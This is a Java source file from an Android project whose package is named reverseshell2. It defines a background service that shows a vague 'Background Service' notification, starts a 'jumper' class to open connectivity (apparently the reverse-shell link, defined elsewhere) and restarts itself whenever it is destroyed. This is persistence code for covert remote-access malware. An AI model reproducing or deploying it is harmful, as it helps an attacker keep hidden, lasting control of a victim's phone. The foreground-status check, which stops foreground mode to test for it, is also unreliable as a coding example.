package com.example.reverseshell2;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class mainService extends Service {
    static String TAG = "mainServiceClass";
    private static final int NOTIFICATION_ID = 1001;
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        // Start as foreground service for Android 8.0+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service starting");
        
        // For Android 8.0+ (Oreo and above), we must start as a foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !isServiceRunningInForeground()) {
            startForegroundService();
        }
        
        // Initialize connectivity
        new jumper(getApplicationContext()).init();
        
        return START_STICKY;
    }
    
    private void startForegroundService() {
        // Create notification channel
        new functions(null).createNotiChannel(getApplicationContext());
        
        // Create intent for notification
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        }
        
        // Build notification for foreground service
        NotificationCompat.Builder notificationBuilder =
                new NotificationCompat.Builder(getApplicationContext(), "channelid")
                        .setContentTitle("Background Service")
                        .setContentText("Service running")
                        .setSmallIcon(R.drawable.ic_launcher_foreground)
                        .setContentIntent(pendingIntent)
                        .setPriority(NotificationCompat.PRIORITY_LOW)
                        .setOngoing(true);
        
        // For Android 12+, update the notification as per requirements
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            notificationBuilder
                    .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE);
        }
        
        Notification notification = notificationBuilder.build();
        startForeground(NOTIFICATION_ID, notification);
    }
    
    private boolean isServiceRunningInForeground() {
        try {
            // If we can remove the notification ID without error, we're not in foreground mode
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_DETACH);
                return false;
            } else {
                stopForeground(true);
                return false;
            }
        } catch (Exception e) {
            return true;
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        // Try to restart the service if it gets destroyed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            new functions(null).jobScheduler(getApplicationContext());
        } else {
            Intent restartServiceIntent = new Intent(getApplicationContext(), mainService.class);
            startService(restartServiceIntent);
        }
    }
}
